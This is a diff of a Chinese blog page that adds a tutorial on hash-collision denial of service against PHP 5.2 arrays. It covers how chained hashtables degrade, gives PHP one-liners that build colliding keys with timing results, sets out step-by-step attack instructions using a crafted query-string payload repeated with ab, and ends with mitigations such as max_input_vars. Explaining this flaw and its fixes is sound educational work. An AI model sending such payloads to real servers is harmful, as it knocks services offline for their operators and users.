@@ -11,15 +11,15 @@
     
 
     
-    <meta name="description" content="不要说话 细细体会">
+    <meta name="description" content="总所周知,php是使用了hashtable来实现的array,那么通过精心构造的array的key值,可以使得hashtable一直处于冲突当中,使得每次操作都需要遍历这个超长链表,造成严重耗时,因而形成攻击效果.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php5.2-利用array降维攻击">
 <meta property="og:url" content="http://xcar.work/2015/05/02/php5-2-rushhash/index.html">
 <meta property="og:site_name" content="CHENS.WANG">
-<meta property="og:description" content="不要说话 细细体会">
+<meta property="og:description" content="总所周知,php是使用了hashtable来实现的array,那么通过精心构造的array的key值,可以使得hashtable一直处于冲突当中,使得每次操作都需要遍历这个超长链表,造成严重耗时,因而形成攻击效果.">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="php5.2-利用array降维攻击">
-<meta name="twitter:description" content="不要说话 细细体会">
+<meta name="twitter:description" content="总所周知,php是使用了hashtable来实现的array,那么通过精心构造的array的key值,可以使得hashtable一直处于冲突当中,使得每次操作都需要遍历这个超长链表,造成严重耗时,因而形成攻击效果.">
 
     
     <link rel="alternative" href="/atom.xml" title="CHENS.WANG" type="application/atom+xml">
@@ -91,11 +91,30 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目錄</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简说php中的hash表"><span class="toc-number">1.</span> <span class="toc-text">简说php中的hash表</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#使用hash函数构造hash表"><span class="toc-number">1.1.</span> <span class="toc-text">使用hash函数构造hash表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用拉链法解决的hash冲突"><span class="toc-number">1.2.</span> <span class="toc-text">使用拉链法解决的hash冲突</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#链表过长带来的损耗"><span class="toc-number">1.3.</span> <span class="toc-text">链表过长带来的损耗</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#如何构造特殊key"><span class="toc-number">2.</span> <span class="toc-text">如何构造特殊key</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#进行攻击"><span class="toc-number">3.</span> <span class="toc-text">进行攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#如何避免"><span class="toc-number">4.</span> <span class="toc-text">如何避免</span></a></li></ol>
 		
 		</div>
 		
-		  
+		<p>总所周知,php是使用了hashtable来实现的array,那么通过精心构造的array的key值,可以使得hashtable一直处于冲突当中,使得每次操作都需要遍历这个超长链表,造成严重耗时,因而形成攻击效果.<br><a id="more"></a></p>
+<h1 id="简说php中的hash表">简说php中的hash表</h1><p>  俗话说的好一切没有索引的都是慢的,PHP为了满足array的快速读写操作,便使用了hashtable来寄存array中的value,它能将大多数的key直接定位到想要找的value中,这一速度往往是非常快的.</p>
+<h2 id="使用hash函数构造hash表">使用hash函数构造hash表</h2><p>  在PHP中使用经典算法<em>TIME33</em>充当hash函数.理论上越好的hash函数会使得hash分布的越散列.分布的越散列,碰撞的可能性就越小.hash函数的原理便是<em>key%num=value,value的范围是0~num</em>.</p>
+<h2 id="使用拉链法解决的hash冲突">使用拉链法解决的hash冲突</h2><p>  对于一个hash函数来说一定会存在不同的key得到相同的hash值得情况.例如<code>(6+1)%6</code>,<code>(6*2+1)%6</code>,<code>(6*3+1)%6</code>值都余1,这种情况下对应到hash表中便产生了碰撞,为了解决碰撞只能在碰撞发生的情况下,把碰撞在一起的值按顺序都存在一列里面.这一列就是链表.</p>
+<h2 id="链表过长带来的损耗">链表过长带来的损耗</h2><p>  诚如上面所说,一切存在索引的都是快的,也可以说成一切需要遍历的都是慢的,当每次访问由于碰撞而产生的链表时都需要从头来遍历这个链表,假设这个hash的大多数值都由于冲突被排列在了这个链表上面,那么每查找一次这个hash表的任何值,实际上都需要从头去遍历整个超长的链表来找到相应的值,一个一个的去查,hash也就失去了索引的作用.整个操作也就变得非常慢.</p>
+<h1 id="如何构造特殊key">如何构造特殊key</h1><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//特殊key</span></span><br><span class="line">time php -r '<span class="label">$arr</span> = array();<span class="keyword">foreach</span>(<span class="keyword">range</span>(0,pow(2&lt;&lt;17,2),2&lt;&lt;17) <span class="keyword">as</span> <span class="label">$key</span>)&#123;<span class="label">$arr</span>[<span class="label">$key</span>]=0;&#125;;echo <span class="string">"array_size:"</span>.<span class="keyword">count</span>(<span class="label">$arr</span>);'</span><br><span class="line"><span class="comment">//普通key</span></span><br><span class="line">time php -r '<span class="label">$arr</span> = array();<span class="keyword">foreach</span>(<span class="keyword">range</span>(0,2&lt;&lt;17) <span class="keyword">as</span> <span class="label">$key</span>)&#123;<span class="label">$arr</span>[<span class="label">$key</span>]=0;&#125;;echo <span class="string">"array_size:"</span>.<span class="keyword">count</span>(<span class="label">$arr</span>);'</span><br></pre></td></tr></table></figure>
+<p>执行一下后对比:<br><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//两次结果</span><br><span class="line">array_size:<span class="number">262145</span>php -r   <span class="number">814.19</span>s <span class="keyword">user</span> <span class="number">4.58</span>s <span class="literal">system</span> <span class="number">98</span>% cpu <span class="number">13</span>:<span class="number">47.10</span> total</span><br><span class="line">array_size:<span class="number">262145</span>php -r   <span class="number">0</span>.<span class="number">14</span>s <span class="keyword">user</span> <span class="number">0</span>.<span class="number">06</span>s <span class="literal">system</span> <span class="number">80</span>% cpu <span class="number">0</span>.<span class="number">249</span> total</span><br></pre></td></tr></table></figure></p>
+<p>  可以看出,两次时间之差令人发指,想要构造一个超慢的array就要从hash函数入手,例如要构造key使得<em>key%num=value,每次的value都是相同的一个</em>,也就是说只要做到<em>(num</em>anynum+value)%num=value<em>这样`key = num</em>anynum+value<code>key符合如此标准,每次都会打到同一个链表上.那边便可以这样来构造array,</code>range(0,pow($size,2),$size)`,这样每次都会循环整数个num,使得value的值相同.</p>
+<h1 id="进行攻击">进行攻击</h1><ol>
+<li>随便找一个运行php5.2的可以提交数据的http接口.</li>
+<li>构造一个特殊的array字符串,例如<code>http://xxx/index.php/interface?&amp;0=0&amp;4096=0&amp;8192=0&amp;12288=0&amp;16384=0&amp;20480=0&amp;24576=0&amp;28672=0&amp;32768=0&amp;36864=0&amp;40960=0&amp;45056=0&amp;49152=0&amp;53248=0&amp;57344=0&amp;61440=0&amp;65536=0&amp;69632=0&amp;73728=0&amp;77824=0&amp;81920=0&amp;86016=0&amp;90112=0&amp;94208=0&amp;98304=0&amp;102400=0&amp;106496=0&amp;110592=0&amp;114688=0&amp;118784=0&amp;122880=0&amp;126976=0&amp;131072=0&amp;135168=0&amp;139264=0&amp;143360=0&amp;...</code>这种感觉的url</li>
+<li>当对方接口进行获取值的时候,便是对数据进行收集并且形成相应数组,攻击便开始了.(尤其是使用某些带安全过滤的框架,更加容易上套).</li>
+<li>找一台机器,ab测试重复刚才操作.<code>./ab -c500 -n500 http://localhost/test.php</code>.便成功的完成了一次攻击.<h1 id="如何避免">如何避免</h1><ol>
+<li>下载path包,点击<a href="https://github.com/laruence/laruence.github.com/tree/master/php-5.2-max-input-vars" target="_blank" rel="external">path包</a>就可以下载了!</li>
+<li>5.3.29以后的版本通过底层增加配置文件<code>max_input_vars</code>&lt;10000,来避免攻击.</li>
+<li>hashtable应用到其他语言,同样可以进行攻击.还受影响的起码有Java,Python,Ruby等!</li>
+</ol>
+</li>
+</ol>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
@@ -144,7 +163,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目錄</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简说php中的hash表"><span class="toc-number">1.</span> <span class="toc-text">简说php中的hash表</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#使用hash函数构造hash表"><span class="toc-number">1.1.</span> <span class="toc-text">使用hash函数构造hash表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用拉链法解决的hash冲突"><span class="toc-number">1.2.</span> <span class="toc-text">使用拉链法解决的hash冲突</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#链表过长带来的损耗"><span class="toc-number">1.3.</span> <span class="toc-text">链表过长带来的损耗</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#如何构造特殊key"><span class="toc-number">2.</span> <span class="toc-text">如何构造特殊key</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#进行攻击"><span class="toc-number">3.</span> <span class="toc-text">进行攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#如何避免"><span class="toc-number">4.</span> <span class="toc-text">如何避免</span></a></li></ol>
  
   </div>
 
@@ -164,7 +183,7 @@
 			
 		
 			
-				<li><a href="/tags/BUG使人进步/" title="BUG使人进步">BUG使人进步<sup>3</sup></a></li>
+				<li><a href="/tags/BUG使人进步/" title="BUG使人进步">BUG使人进步<sup>2</sup></a></li>
 			
 		
 			
@@ -184,14 +203,6 @@
 			
 		
 			
-				<li><a href="/tags/优雅的nginx/" title="优雅的nginx">优雅的nginx<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/漏洞/" title="漏洞">漏洞<sup>1</sup></a></li>
-			
-		
-			
 				<li><a href="/tags/hexo/" title="hexo">hexo<sup>1</sup></a></li>
 			
 		
@@ -201,6 +212,10 @@
 		
 			
 				<li><a href="/tags/诗和远方/" title="诗和远方">诗和远方<sup>1</sup></a></li>
+			
+		
+			
+		
 			
 		
 		</ul>
